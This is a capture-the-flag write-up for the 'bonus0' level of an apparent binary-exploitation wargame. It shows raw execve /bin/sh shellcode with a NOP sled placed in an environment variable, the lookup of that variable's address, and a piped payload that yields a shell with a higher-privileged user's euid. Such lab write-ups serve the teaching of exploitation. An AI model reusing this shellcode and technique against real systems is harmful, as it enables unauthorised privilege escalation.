# bonus0

## Shellcode building

We're using a shellcode sample from [shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-841.html), check it out for more information. We also add a bit of NOP padding just in case our arguments get messed up a bit, this will allow the jump into the stack to be less precise, since it will have a higher chance to fall into NOPs and slide into our shellcode.

```bash
rainfall $ export SHELLCODE=$(python -c 'print "\x90"*1000')$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
```

We then use our handy `env.c` script to find the address of the environment variable in non-relocated memory:

```bash
rainfall $ cc /tmp/env.c -o /tmp/env
...
rainfall $ /tmp/env | grep SHELLCODE
0xbffff8d2 => SHELLCODE=1��Qh//shh/bin�
```

Neat! We can now build our payload (see [payload-bonus0.py](payload-bonus0.py)):

```bash
host $ python3 payload-bonus0.py | xclip -selection c
...
rainfall $ (echo -en '<shellcode>'; cat) | ./bonus0
 - 
 - 
BBBBBBBBBBBBBBBBBBB   
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
```

yippieeeeeeee
